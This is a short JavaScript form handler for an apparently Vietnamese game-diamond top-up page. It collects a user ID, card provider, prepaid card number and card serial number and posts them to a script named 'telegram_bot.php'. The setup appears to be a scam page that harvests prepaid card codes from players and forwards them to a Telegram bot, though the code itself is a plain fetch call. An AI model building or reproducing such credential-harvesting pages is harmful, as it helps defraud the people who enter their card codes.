document.getElementById("napForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const formData = {
    userId: document.getElementById("userId").value,
    provider: document.getElementById("provider").value,
    diamonds: document.getElementById("diamonds").value,
    value: document.getElementById("value").value,
    cardNumber: document.getElementById("cardNumber").value,
    serialNumber: document.getElementById("serialNumber").value
  };

  document.getElementById("result").innerHTML = "⏳ Đang xử lý, vui lòng chờ...";

  fetch("telegram_bot.php", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(formData)
  })
    .then(res => res.json())
    .then(data => {
      if (data.status === "success") {
        document.getElementById("result").innerHTML = "✅ " + data.message;
      } else {
        document.getElementById("result").innerHTML = "❌ " + data.message;
      }
    })
    .catch(err => {
      document.getElementById("result").innerHTML = "⚠️ Lỗi kết nối: " + err;
    });
});